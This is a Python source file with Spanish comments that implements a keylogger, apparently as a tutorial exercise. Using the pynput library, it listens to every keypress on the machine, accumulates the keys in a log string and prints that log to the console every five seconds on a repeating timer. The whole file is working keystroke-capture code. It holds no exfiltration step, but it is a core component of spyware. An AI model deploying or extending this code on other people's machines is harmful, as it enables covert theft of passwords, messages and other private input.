# Importa el módulo 'keyboard' del paquete 'pynput', que permite escuchar eventos del teclado.
import pynput.keyboard
import threading

# Inicializa una cadena vacía para almacenar el registro de las teclas presionadas.
log = ""

# Define una clase llamada 'Keylogger'.
class Keylogger: 
    # Define un método para procesar cada tecla presionada.
    def process_key_press(self, key):
        global log  # Declara que vamos a usar la variable global 'log'.
        try: 
            # Intenta agregar el carácter de la tecla presionada al registro.
            log = log + str(key.char) 
        except AttributeError:
            # Si ocurre un AttributeError (por ejemplo, si la tecla no tiene un atributo 'char'):
            if key == key.space:
                # Si la tecla presionada es un espacio, agrega un espacio al registro.
                log = log + " "
            else:
                # Si no es un espacio, agrega una representación de la tecla y dos espacios al registro.
                log = log + " " + str(key) + "  " 

    # Define un método para informar sobre el contenido del registro cada cierto tiempo.
    def report(self):
        global log  # Declara que vamos a usar la variable global 'log'.
        # Imprime el registro de teclas en la consola.
        print(log)
        # Reinicia el registro de teclas a una cadena vacía.
        log = ""
        # Crea un temporizador que llama a 'self.report' cada 5 segundos.
        timer = threading.Timer(5, self.report)
        # Inicia el temporizador.
        timer.start() 

    # Define un método para iniciar el keylogger.
    def start(self):
        # Crea un objeto 'Listener' de 'pynput.keyboard' que escuchará los eventos del teclado.
        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key_press)
        # Usa el objeto 'Listener' en un contexto de 'with' para asegurarse de que se inicie y se detenga correctamente.
        # Dentro de este contexto, el listener se mantendrá activo y ejecutará 'process_key_press' cuando se presione una tecla.
        with keyboard_listener:
            # Llama al método 'report' para comenzar a imprimir el registro de teclas cada 5 segundos.
            self.report()
            # Espera a que el listener termine su ejecución. Este método bloquea el hilo actual y mantiene el listener activo.
            keyboard_listener.join()
